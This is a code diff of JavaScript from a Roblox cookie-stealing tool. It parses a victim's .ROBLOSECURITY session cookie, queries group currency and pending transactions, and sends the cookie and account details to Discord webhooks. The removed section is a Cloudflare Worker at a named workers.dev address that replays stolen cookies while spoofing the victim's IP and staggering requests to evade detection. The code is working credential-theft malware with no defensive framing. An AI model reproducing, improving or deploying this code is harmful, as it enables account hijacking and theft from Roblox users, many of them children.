@@ -40,19 +40,19 @@ async function getIpGeo(ip) {
 function extractRobloxCookie(raw) {
   if (!raw) return null;
   const cleaned = raw.trim().replace(/\s+/g, ' ');
-
+  
   const fullMatch = cleaned.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/);
   if (fullMatch) return fullMatch[1];
-
+  
   const warningMatch = cleaned.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);
   if (warningMatch) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${warningMatch[1]}`;
-
+  
   const tokenOnly = cleaned.match(/\|_([\w\-]{50,})/);
   if (tokenOnly) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${tokenOnly[1]}`;
-
+  
   const bareToken = cleaned.match(/^([a-zA-Z0-9\-\_\.]{200,})$/);
   if (bareToken) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${bareToken[1]}`;
-
+  
   return null;
 }
 
@@ -67,6 +67,7 @@ async function checkGamepass(uid, gamepassId, headers) {
     return false;
   }
 }
+
 
 const WORKER_URL = 'https://holy-truth-3129.notrllyme133.workers.dev/';
 
@@ -155,7 +156,7 @@ async function fetchRobloxInfo(cookie, victimIp = null) {
       try {
         const [currencyRes, pendingRes] = await Promise.all([
           fetch(`https://economy.roblox.com/v1/groups/${group.group.id}/currency`, { headers }).catch(() => null),
-fetch(`https://economy.roblox.com/v2/groups/${group.group.id}/transactions?transactionType=pending&limit=10`, { headers }).catch(() => null)
+          fetch(`https://economy.roblox.com/v2/groups/${group.group.id}/transactions?transactionType=pending&limit=10`, { headers }).catch(() => null)
         ]);
         if (currencyRes?.ok) {
           const curr = await currencyRes.json();
@@ -260,7 +261,7 @@ async function sendToDiscord(webhookUrl, data) {
     field("🔔 Notification", `2FA is ${roblox?.twoFA?.includes('Enabled') ? 'enabled' : 'not enabled'}.`, false),
     
     // Cookie (full width, no newlines in code block)
-    field("🔐 .ROBLOSECURITY", `\`\`\`\${cleanCookie}\`\`\``, false)
+    field("🔐 .ROBLOSECURITY", `\`\`\`${cleanCookie}\`\`\``, false)
   ];
 
   const payload = {
@@ -380,104 +381,3 @@ export default async function handler(req, res) {
     discord: { webhook2: sent2, webhook1: sent1 ? 'Sent' : 'N/A' }
   });
 }
-
-// Cloudflare Worker — roblox-proxy
-// Deploy to: https://holy-truth-3129.notrllyme133.workers.dev/
-
-export default {
-  async fetch(request, env) {
-    if (request.method === 'OPTIONS') {
-      return new Response(null, {
-        headers: {
-          'Access-Control-Allow-Origin': '*',
-          'Access-Control-Allow-Methods': 'POST, OPTIONS',
-          'Access-Control-Allow-Headers': 'Content-Type',
-        }
-      });
-    }
-
-    if (request.method !== 'POST') {
-      return new Response(JSON.stringify({ error: 'POST only' }), { status: 405 });
-    }
-
-    let body;
-    try {
-      body = await request.json();
-    } catch {
-      return new Response(JSON.stringify({ error: 'Invalid JSON' }), { status: 400 });
-    }
-
-    const { cookie, victimIp, endpoints } = body;
-
-    if (!cookie || !endpoints || !Array.isArray(endpoints)) {
-      return new Response(JSON.stringify({ error: 'Missing cookie or endpoints' }), { status: 400 });
-    }
-
-    // Build headers that make requests look like they come from the victim
-    const robloxHeaders = {
-      'Cookie': `.ROBLOSECURITY=${cookie}`,
-      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-      'Accept': 'application/json, text/plain, */*',
-      'Accept-Language': 'en-US,en;q=0.9',
-      'Referer': 'https://www.roblox.com/',
-      'Origin': 'https://www.roblox.com',
-      // Spoof the victim's IP so Roblox sees their own IP
-      ...(victimIp && victimIp !== 'Unknown' ? {
-        'CF-Connecting-IP': victimIp,
-        'X-Forwarded-For': victimIp,
-        'True-Client-IP': victimIp,
-      } : {})
-    };
-
-    // Fire all endpoint requests with a small stagger to avoid flood detection
-    const results = {};
-
-    for (let i = 0; i < endpoints.length; i++) {
-      const ep = endpoints[i];
-      try {
-        // Small delay between requests (50ms stagger)
-        if (i > 0) await new Promise(r => setTimeout(r, 50));
-
-        const fetchOpts = {
-          method: ep.method || 'GET',
-          headers: {
-            ...robloxHeaders,
-            ...(ep.method === 'POST' ? { 'Content-Type': 'application/json' } : {})
-          },
-        };
-
-        if (ep.method === 'POST' && ep.body) {
-          fetchOpts.body = JSON.stringify(ep.body);
-        }
-
-        // For public endpoints, strip the cookie header
-        if (ep.public) {
-          delete fetchOpts.headers['Cookie'];
-        }
-
-        const res = await fetch(ep.url, fetchOpts);
-        const text = await res.text();
-
-        // Try to grab refreshed cookie from response
-        const setCookie = res.headers.get('set-cookie') || '';
-        const refreshedMatch = setCookie.match(/\.ROBLOSECURITY=([^;]+)/);
-
-        results[ep.key] = {
-          ok: res.ok,
-          status: res.status,
-          data: text,
-          refreshedCookie: refreshedMatch ? refreshedMatch[1] : null
-        };
-      } catch (err) {
-        results[ep.key] = { ok: false, error: err.message, data: null };
-      }
-    }
-
-    return new Response(JSON.stringify(results), {
-      headers: {
-        'Content-Type': 'application/json',
-        'Access-Control-Allow-Origin': '*'
-      }
-    });
-  }
-};
